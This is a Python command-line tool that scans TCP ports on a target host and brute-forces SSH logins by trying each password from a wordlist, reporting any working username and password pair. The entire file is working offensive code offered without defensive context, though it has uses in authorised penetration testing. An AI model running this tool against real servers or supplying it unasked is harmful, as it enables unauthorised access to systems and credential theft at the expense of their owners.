import socket
import time
from colorama import init, Fore
import paramiko
import argparse

# Initialize colorama
init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

def parse_range(value):
    """
    Parse the string obtained from the 'P' argument into a range
    :param value: (Str) obtained from the P argument on the CLI
    :return: Range
    """
    x = value.split('-')
    start, end = x
    try:
        # Typecasting to integer
        start = int(start)
        end = int(end)
        if start <= end:
            return range(start, end + 1)
    except ValueError:
        pass
    raise argparse.ArgumentTypeError('Invalid port range format')

def scan_range(host, ports):
    """
    Scan a range of ports
    :param ports: (range) range of ports to scan
    :param host: (str) host to scan
    :return: None
    """
    for port in ports:
        scan_port(host, port)

def scan_port(host, port):
    """
    Scan a single port
    :param port: (int) port to scan
    :param host: (str) host to scan
    :return: None
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Setting the timeout to 0.3 seconds
        sock.settimeout(0.3)
        result = sock.connect_ex((host, port))
        if result == 0:
            print(f"The port {port} is open")
        else:
            pass
    except OSError as e:
        print(f"Connection Error: {e}")
    finally:
        # Closing the socket
        sock.close()

def brute_force_ssh(host, username, password_file):
    """
    SSH Brute force tool
    :param host: (str) Hostname to connect to
    :param username: (str) Username to use to connect
    :param password_file: (str) File containing the password list
    :return: None
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with open(password_file, "r") as file:
            for password in file:
                password = password.strip()
                try:
                    client.connect(hostname=host, username=username, password=password, timeout=1)
                    print(f"{GREEN}[+] Found Combo: {username}:{password}{RESET}")
                    break
                except paramiko.AuthenticationException:
                    print(f"{RED}[-] Invalid Credentials: {username}:{password}{RESET}")
                except paramiko.SSHException as e:
                    print(f"{BLUE}[*] Quota exceeded, retrying after 1 minute...{RESET}")
                    time.sleep(60)
                    continue
    except FileNotFoundError:
        print(f"{RED}[-] Password file not found: {password_file}{RESET}")

    client.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='TCP Port Scanning and SSH Bruteforcing')
    parser.add_argument('-H', '--host', help='Target IP address or hostname')
    parser.add_argument('-p', '--port', type=int, help='Single port to scan')
    parser.add_argument('-P', '--ports', type=parse_range, help='Port range to scan (e.g., 20-80)')
    parser.add_argument('-u', '--user', help='Username for SSH brute-forcing')
    parser.add_argument('-f', '--passfile', help='File containing the password list')
    args = parser.parse_args()

    host = args.host
    port = args.port
    ports = args.ports
    username = args.user
    password_file = args.passfile

    if host and port:
        scan_port(host, port)
    elif host and ports:
        scan_range(host, ports)
    elif host and username and password_file:
        brute_force_ssh(host, username, password_file)
    else:
        parser.print_help()


